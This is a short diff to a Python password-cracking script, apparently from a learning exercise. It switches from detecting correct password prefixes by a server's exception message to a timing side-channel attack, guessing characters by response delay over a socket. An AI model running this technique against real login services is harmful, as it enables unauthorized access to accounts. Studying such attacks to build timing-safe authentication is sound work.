@@ -2,12 +2,11 @@ import json
 import os
 import socket
 import string
+import time
 from sys import argv
 
 WRONG_PWD_MSG = 'Wrong password!'
-EXCEPTION_MSG = 'Exception happened during login'
 SUCCESS_MSG = 'Connection success!'
-LETTER_FOUND_MSGS = [EXCEPTION_MSG, SUCCESS_MSG]
 LETTERS = string.ascii_letters + string.digits
 
 
@@ -38,8 +37,10 @@ def find_pwd(login: str, s: socket.socket) -> str:
     while msg != SUCCESS_MSG:
         for i in range(len(LETTERS)):
             sym = LETTERS[i]
+            start_time = time.perf_counter()
             msg = send_receive(login, pwd + sym, s)
-            if msg in LETTER_FOUND_MSGS:
+            duration = time.perf_counter() - start_time
+            if msg == SUCCESS_MSG or duration >= .1:
                 break
         pwd += sym
     return pwd
